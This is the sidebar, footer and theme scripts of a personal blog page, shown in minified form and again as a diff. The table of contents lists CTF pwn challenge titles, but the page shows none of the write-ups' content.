href="#forot"><span class="nav-number">1.8.</span> <span class="nav-text">forot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">1.9.</span> <span class="nav-text">Mary_Morton</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warmup"><span class="nav-number">1.10.</span> <span class="nav-text">warmup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwnable"><span class="nav-number">2.</span> <span class="nav-text">pwnable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fd"><span class="nav-number">2.1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bof"><span class="nav-number">2.2.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#collision"><span class="nav-number">2.3.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">2.4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passcode"><span class="nav-number">2.5.</span> <span class="nav-text">passcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#论剑场"><span class="nav-number">3.</span> <span class="nav-text">论剑场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn4"><span class="nav-number">3.1.</span> <span class="nav-text">pwn4</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><p class="site-author-name" itemprop="name">ooo</p><div class="site-description" itemprop="description">0x446e37fb</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">42</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/"><span class="site-state-item-count">14</span> <span class="site-state-item-name">categories</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/"><span class="site-state-item-count">3</span> <span class="site-state-item-name">tags</span></a></div></nav></div><div class="cc-license motion-element" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a></div><div class="links-of-blogroll motion-element"><div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i> Links</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"> <a href="https://hack-for.fun/" title="https:&#x2F;&#x2F;hack-for.fun&#x2F;" rel="noopener" target="_blank">M0nk3y</a></li><li class="links-of-blogroll-item"> <a href="http://i0gan.cn:81/" title="http:&#x2F;&#x2F;i0gan.cn:81&#x2F;" rel="noopener" target="_blank">i0gan</a></li><li class="links-of-blogroll-item"> <a href="http://happi0.gitee.io/" title="http:&#x2F;&#x2F;happi0.gitee.io&#x2F;" rel="noopener" target="_blank">happi0</a></li><li class="links-of-blogroll-item"> <a href="https://vino0o0o.github.io/" title="https:&#x2F;&#x2F;vino0o0o.github.io&#x2F;" rel="noopener" target="_blank">Vino0o0o</a></li></ul></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2021</span><span class="with-love"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">ooo</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-chart-area"></i></span> <span class="post-meta-item-text">Symbols count total:</span> <span title="Symbols count total">325k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span class="post-meta-item-text">Reading time total &asymp;</span> <span title="Reading time total">4:56</span></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,model:{jsonPath:"/live2dw/assets/wanko.model.json"},display:{position:"left",width:150,height:300},mobile:{show:!0},log:!1})</script></body></html>
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻防世界"><span class="nav-number">1.</span> <span class="nav-text">攻防世界</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#guess-num"><span class="nav-number">1.1.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.2.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#string"><span class="nav-number">1.4.</span> <span class="nav-text">string</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">1.5.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dice-game"><span class="nav-number">1.6.</span> <span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack2"><span class="nav-number">1.7.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#forot"><span class="nav-number">1.8.</span> <span class="nav-text">forot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">1.9.</span> <span class="nav-text">Mary_Morton</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warmup"><span class="nav-number">1.10.</span> <span class="nav-text">warmup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwnable"><span class="nav-number">2.</span> <span class="nav-text">pwnable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fd"><span class="nav-number">2.1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bof"><span class="nav-number">2.2.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#collision"><span class="nav-number">2.3.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">2.4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passcode"><span class="nav-number">2.5.</span> <span class="nav-text">passcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#论剑场"><span class="nav-number">3.</span> <span class="nav-text">论剑场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn4"><span class="nav-number">3.1.</span> <span class="nav-text">pwn4</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ooo</p>
+  <div class="site-description" itemprop="description">0x446e37fb</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hack-for.fun/" title="https:&#x2F;&#x2F;hack-for.fun&#x2F;" rel="noopener" target="_blank">M0nk3y</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://i0gan.cn:81/" title="http:&#x2F;&#x2F;i0gan.cn:81&#x2F;" rel="noopener" target="_blank">i0gan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://happi0.gitee.io/" title="http:&#x2F;&#x2F;happi0.gitee.io&#x2F;" rel="noopener" target="_blank">happi0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://vino0o0o.github.io/" title="https:&#x2F;&#x2F;vino0o0o.github.io&#x2F;" rel="noopener" target="_blank">Vino0o0o</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ooo</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">326k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">4:56</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+  <!-- ҳ����С���� -->
+   <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
